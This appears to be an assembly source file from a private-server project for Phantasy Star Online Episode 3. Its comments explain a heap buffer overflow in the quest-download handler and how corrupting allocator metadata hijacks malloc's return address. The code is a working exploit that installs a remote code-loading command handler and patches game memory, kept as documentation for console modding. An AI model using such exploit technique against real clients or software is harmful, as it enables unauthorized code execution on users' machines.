# This program was an early attempt at restoring B2 patching functionality to
# Episode 3. It is no longer used, since the quest loading method is more
# reliable, but this file remains for documentation purposes.

# There is a buffer overflow bug in PSO Episode 3 that this program uses to
# achieve arbitrary code execution. (This bug is likely present in all versions
# of PSO, but the code here is specific to the USA version of Episode 3.) This
# is only necessary because the non-Japanese versions of Episode 3 lack the B2
# command, which is used on other console PSO versions to send patches and other
# bits of code. Here, we use a buffer overflow bug to re-implement the B2
# command, which allows the server to treat PSO Episode 3 like any other version
# of PSO with respect to patching or loading DOL files.

# For some background, PSO sends download quest files via the A6 and A7
# commands. The A6 command is used to start sending a download quest file; it
# includes the quest name, file name, and total file size. The A7 command is
# used to send a chunk of 1KB (0x400 bytes) of data, or less if it's the final
# chunk of the file. When the client receives an A6 command for a filename
# ending in .bin, it allocates a buffer of (file size + 0x48) bytes. When it
# later receives an A7 command, it copies (cmd.data_size) bytes from the command
# to position (8 + 0x100 * flag) in the buffer, then if cmd.data_size was less
# than 0x400, it marks the file as done and postprocesses it.

# However, the client neglects to check if the last chunk overflows the end of
# the buffer before copying the chunk data. In this function, we send an A6
# command with an overall file size of only 0x18 bytes, then we send a chunk of
# 0x200 or so bytes (the compiled size of the code in this file), which
# overflows past the end of the allocated buffer and overwrites part of a free
# block after the allocated buffer. The memory allocator library keeps some of
# its bookkeeping structures at the beginning of this free block, which we use
# to cause the next call to malloc() to overwrite its own return address on the
# stack. Conveniently, this call happens soon afterward, during the
# postprocessing step.

# The PSO memory allocator is a simple free-list allocator. The allocator
# maintains two linked lists of blocks: one for allocated blocks and one for
# free blocks. The list of free blocks is sorted in order of memory address, but
# the list of allocated blocks is sorted in the order they were allocated. (The
# order of the allocated block list does not matter for the allocator's
# performance or correctness.)

# Each block begins with two pointers, prev and next, which point to other
# blocks in the allocated or free list. (As with a typical doubly-linked list,
# the first block has prev == nullptr and the last block has next == nullptr;
# there is no sentinel node on either end.) After these two pointers is the
# block's size in bytes, followed by 0x14 unused bytes. The block data
# immediately follows this 0x20-byte header structure. All block sizes are
# rounded up to a multiple of 0x20 bytes.

# The malloc() routine simply searches for the first free block that has enough
# space to satisfy the request, and either splits it into an allocated and a
# free block (if the free block's size is at least 0x40 bytes more than the
# requested size), or converts the free block entirely into an allocated block
# and returns it. It is the second case that we take advantage of here.

# When we send our A7 command containing this program, the first 0x58 bytes of
# it fill the quest file data buffer. The next 0x0C bytes of it overwrite the
# header fields of the following free block (noted below in the comments), and
# the remainder of the data goes into that block's unused header fields and the
# block's data (which is also otherwise unused, since it is a free block). We
# overwrite the free block's prev and next pointers with specific nonzero values
# and overwrite the size with the exact size that the caller will request, so we
# trigger the malloc() case that does not split the free block. When that code
# attempts to remove the free block from its doubly-linked list, it writes
# block->next to block->prev->next and block->prev to block->next->prev. We set
# block->prev to the address where we want execution to jump to (the start label
# here), and block->next to the address of malloc()'s return address on the
# stack. This overwrites the return address with the start label's address, and
# overwrites the word after the start label with an address within the stack. We
# can't avoid this second write since both pointers must be non-null and the
# values and addresses written are dependent on each other, but we can just use
# a branch opcode to ignore the value that gets written into our code.

# Once we have control, we clean up the allocator state (restoring the free
# block as it was before we overwrote its header), then copy our implementation
# of the B2 command to an otherwise-unused area of memory and apply a few more
# patches. See the comments within the code below for more details.



# This entry_ptr label isn't used since this code isn't sent with the B2
# command; it just needs to be present for newserv to compile the code properly
entry_ptr:

start:
  b       resume1
  # This is the value overwritten by malloc() when it attempts to remove the
  # free block from its linked list
  .data   0xAAAAAAAA

resume1:
  # We can use any of the caller-save registers (r0, r3-r12) here.

  # At entry time, some registers contain useful values:
  # r5: Address of the allocator instance ("lists"). This structure includes the
  #     allocated and free list head pointers, one of which we have to update.
  # r12: Address of the malloc() function that was called. Conveniently, the
  #      address that we should return to is very near this location in memory.

  # Compute the LR we should use to return from this function, but don't put it
  # in the LR just yet - we're still going to need the LR for other shenanigans
  subi    r11, r12, 0xB0 # 8038C1B8 - B0 = 8038C108

  # Restore the free block whose header we had destroyed with the A7 command
  # buffer overflow
  lis     r7, 0x815F
  ori     r7, r7, 0xF440
  li      r0, 0
  stw     [r7], r0 # free_block->prev = nullptr
  stw     [r7 + 4], r0 # free_block->next = nullptr
  lis     r6, 0x001E
  ori     r6, r6, 0x0960
  stw     [r7 + 8], r6 # free_block->size = 0x001E0960
  stw     [r5 + 4], r7 # lists->free_head = free_block

  # Restore lists->allocated_head and clear its prev pointer
  lis     r6, 0x815F
  ori     r6, r6, 0xF3C0
  stw     [r5 + 8], r6 # lists->allocated_head = orig_allocated_head
  stw     [r6], r0 # lists->allocated_head->prev = nullptr

  b       resume2

  # TODO: We can probably use this space for something useful. There must be
  # exactly 20 opcodes (0x50 bytes) between resume1 and opaque2.
  .zero
  .zero
  .zero
  .zero
  .zero

opaque2:
  # This block must be exactly here (the number of opcodes above is exactly how
  # many will fit in the original buffer), and the 3 words here must have
  # exactly these values. This is what causes malloc to overwrite the return
  # address on the stack to call this code in the first place.
  .data   0x815FF3E8 # free_head->prev
  .data   0x80592AC4 # free_head->next
  .data   0x00000160 # free_head->size

resume2:
  bl      get_handle_B2_ptr

  # This is the code we're going to use for the B2 command handler, which we
  # will copy into an unused area of memory. It's convenient to put it here and
  # use a bl opcode to get its address, so this code can be minimally position-
  # dependent. Note that this part of the code does not run at the time the A7
  # command is received; it will run later if the client receives a B2 command.
handle_B2:
  mflr    r0
  stwu    [r1 - 0x40], r1
  stw     [r1 + 0x44], r0

  # Arguments:
  # r3 = TProtocol* proto (we use this to call the send function)
  # r4 = void* data
  # Returns: void

  # Stack:
  # [r1+08] = B3 XX 0C 00
  # [r1+0C] = code section's return value
  # [r1+10] = checksum
  # [r1+14] = saved ctx argument
  # [r1+18] = saved data argument
  # We reserved 0x40 bytes on the stack because I was lazy.
  stw     [r1 + 0x14], r3
  stw     [r1 + 0x18], r4

  # Set up the reply header (B3 XX 0C 00, where XX comes from the B2 command)
  lbz     r5, [r4 + 1]
  rlwinm  r5, r5, 16, 8, 15
  oris    r5, r5, 0xB300
  ori     r5, r5, 0x0C00
  stw     [r1 + 0x08], r5

  # If there's no code section, skip it. We also write the code section size to
  # the return value field (which will be overwritten later if the size is not
  # zero). This is because I'm lazy and this gives the behavior we want: the
  # code return value is always zero if the code section size is zero.
  li      r6, 4
  lwbrx   r5, [r4 + r6] # r5 = code_size
  stw     [r1 + 0x0C], r5 # response.code_return_value = code_size
  cmplwi  r5, 0
  beq     handle_B2_skip_code

  # Get the code section base and footer addresses
  addi    r6, r4, 0x10 # r6 = code base address
  add     r7, r6, r5
  subi    r7, r7, 0x20 # r7 = footer address (code base + code size - 0x20)

  # Check if there are relocations to do
  lwz     r8, [r7 + 4] # r8 = num relocations
  cmplwi  r8, 0
  beq     handle_B2_skip_relocations

  # Execute the relocations
  mtctr   r8
  lwz     r8, [r7] # r8 = relocations list offset
  add     r8, r8, r6 # r8 = relocations list address
  subi    r8, r8, 2 # Back up one space so we can use lhzu in the loop
  mr      r10, r6 # relocation pointer = code base address
handle_B2_relocate_again:
  lhzu    r9, [r8 + 2]
  rlwinm  r9, r9, 2, 0, 29 # r9 = next_relocation_offset * 4
  add     r10, r10, r9 # relocation pointer += next_relocation_offset * 4
  lwz     r9, [r10]
  add     r9, r9, r6
  stw     [r10], r9 # (*relocation pointer) += code base address
  bdnz    handle_B2_relocate_again
handle_B2_skip_relocations:

  # Invalidate the caches appropriately for the newly-copied code
  lis     r0, 0x8000
  ori     r0, r0, 0xC324
  mr      r3, r6
  mr      r4, r5
  mtctr   r0
  bctrl   # flush_code(code_base_addr, code_section_size)

  # Call the code section and put the return value (byteswapped) on the stack
  # Note: flush_code only uses r3, r4, and r5, so we don't need to reload r7
  # after the above call
  lwz     r8, [r7 + 0x10]
  lwzx    r8, [r8 + r6]
  mtctr   r8
  bctrl
  li      r8, 0x0C
  stwbrx  [r1 + r8], r3
handle_B2_skip_code:

  # Get the checksum function args
  lwz     r4, [r1 + 0x18]
  li      r5, 0x08
  lwbrx   r3, [r4 + r5] # checksum addr
  li      r5, 0x0C
  lwbrx   r4, [r4 + r5] # checksum size
  lis     r0, 0x8010
  ori     r0, r0, 0xF834
  mtctr   r0
  bctrl   # crc32(checksum_addr, checksum_size)
  li      r8, 0x10
  stwbrx  [r1 + r8], r3

  # Send the response (B3 command)
  lwz     r3, [r1 + 0x14]
  lwz     r4, [r3 + 0x18]
  lwz     r4, [r4 + 0x28]
  mtctr   r4
  addi    r4, r1, 0x08
  li      r5, 0x0C
  bctrl   # TProtocol::send_command(ctx, &reply_data, 0x0C)

  # Clean up stack and return
  lwz     r0, [r1 + 0x44]
  addi    r1, r1, 0x40
  mtlr    r0
  blr

get_handle_B2_ptr:
  mflr    r9 # r9 = &handle_B2
  bl      get_handle_B2_end_ptr
get_handle_B2_end_ptr:
  mflr    r10
  subi    r10, r10, 8 # r10 = pointer to end of handle_B2

  # Copy handle_B2 to 8000BD80, which is normally unused by the game
  lis     r12, 0x8000
  ori     r12, r12, 0xBD80 # r12 = 0x8000BD80
  sub     r7, r10, r9
  rlwinm  r7, r7, 30, 2, 31 # r7 = number of words to copy
  mtctr   r7
  subi    r8, r12, 4 # r8 = r12 - 4 (so we can use stwu)
  subi    r9, r9, 4 # r9 = r9 - 4 (so we can use lwzu)
copy_handle_B2_word_again:
  lwzu    r0, [r9 + 4]
  stwu    [r8 + 4], r0
  bdnz    copy_handle_B2_word_again

  # Invalidate the caches appropriately for the newly-copied code
  lis     r9, 0x8000
  ori     r9, r9, 0xC324
  mtctr   r9
  mr      r3, r12
  rlwinm  r4, r7, 2, 0, 29
  bctrl   # flush_code(copied_B2_handler, copied_B2_handler_bytes)

  # Replace the command handler table entry for command 0E (which appears to be
  # a legacy command and has very broken behavior) with our B2 implementation
  lis     r5, 0x8044
  ori     r5, r5, 0xF684
  li      r0, 0x00B2
  stw     [r5], r0
  stw     [r5 + 0x0C], r12

  # Patch both places in the code where command 9E is sent to make them include
  # a sentinel value that newserv can use to determine if the client has already
  # run the code in this file
  bl      get_patch_9E_1_ptr
patch_9E_1:
  lis     r4, 0x5F5C
  ori     r4, r4, 0xA297
  stw     [r1 + 0x14], r4 # Set cmd.unused1 to 0x5F5CA297 (in send_9E_long)
get_patch_9E_1_ptr:
  lis     r3, 0x800F
  ori     r3, r3, 0x3338
  mflr    r4
  lwz     r0, [r4]
  stw     [r3], r0
  lwz     r0, [r4 + 4]
  stw     [r3 + 4], r0
  lwz     r0, [r4 + 8]
  stw     [r3 + 8], r0
  li      r4, 0x20
  mtctr   r9
  bctrl   # flush_code(patch_9E_1_dest, 0x20)

  bl      get_patch_9E_2_ptr
patch_9E_2:
  lis     r4, 0x5F5C
  ori     r4, r4, 0xA297
  stw     [r1 + 0x60], r4 # Set cmd.unused1 to 0x5F5CA297 (in handle_02)
get_patch_9E_2_ptr:
  lis     r3, 0x800F
  ori     r3, r3, 0x3644
  mflr    r4
  lwz     r0, [r4]
  stw     [r3], r0
  lwz     r0, [r4 + 4]
  stw     [r3 + 4], r0
  lwz     r0, [r4 + 8]
  stw     [r3 + 8], r0
  li      r4, 0x20
  mtctr   r9
  bctrl   # flush_code(patch_9E_2_dest, 0x20)

  # Finally, patch the A7 handler function (which is on the current callstack)
  # so that it does nothing else if this function returns null, which prevents
  # further memory corruption. This changes a beq opcode (which never triggers
  # under normal circumstances) to skip a couple more function calls, one of
  # which would cause memory corruption if executed because the original buffer
  # is smaller than 0x100 bytes.
  lis     r3, 0x8010
  ori     r3, r3, 0xFD8A
  li      r4, 0x0064
  sth     [r3], r4
  rlwinm  r3, r3, 0, 0, 27
  li      r4, 0x20
  mtctr   r9
  bctrl   # flush_code(patched_opcode_address & 0xFFFFFFF0, 0x20)

  # Return null instead of a malloc'ed block, which triggers the conditional
  # branch we just patched above
  li      r3, 0
  mtlr    r11
  blr
